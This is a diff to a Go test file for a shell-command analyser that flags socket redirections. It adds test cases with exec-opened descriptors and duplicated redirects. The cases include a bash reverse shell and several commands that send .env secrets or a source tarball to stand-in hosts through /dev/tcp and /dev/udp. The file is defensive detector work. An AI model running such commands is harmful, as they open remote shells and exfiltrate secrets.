@@ -18,7 +18,16 @@ func TestSocketRedirects(t *testing.T) {
 		{"cat .env >/dev/udp/10.0.0.1/53", []string{"cat:write:/dev/udp/10.0.0.1/53"}},
 		{"cat < /dev/tcp/host.example/80", []string{"cat:read:/dev/tcp/host.example/80"}},
 		{`tar czf - src > "/dev/tcp/$HOST/$PORT"`, []string{"tar:write:/dev/tcp/$HOST/$PORT"}},
-		{"bash -i >& /dev/tcp/host.example/4444 0>&1", []string{"bash:write:/dev/tcp/host.example/4444"}},
+		{"bash -i >& /dev/tcp/host.example/4444 0>&1", []string{"bash:write:/dev/tcp/host.example/4444", "bash:read:/dev/tcp/host.example/4444"}},
+		// A duplication within one command copies what its earlier redirections opened.
+		{"exec 3<>/dev/tcp/host.example/4444 >&3; cat .env", []string{
+			"exec:readwrite:/dev/tcp/host.example/4444", "exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"cat .env 3>/dev/tcp/host.example/4444 >&3", []string{"cat:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		// A compound's duplication of a descriptor an exec opened.
+		{"exec 3<>/dev/tcp/host.example/4444; { cat .env; } >&3", []string{
+			"exec:readwrite:/dev/tcp/host.example/4444", "{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"exec 3<>/dev/tcp/host.example/4444; (cat .env) >&3", []string{
+			"exec:readwrite:/dev/tcp/host.example/4444", "{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
 		// A descriptor an exec opened, used by a later command, in the direction it uses it.
 		{"exec 3<>/dev/tcp/host.example/4444; cat .env >&3; cat <&3", []string{
 			"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444", "cat:read:/dev/tcp/host.example/4444"}},
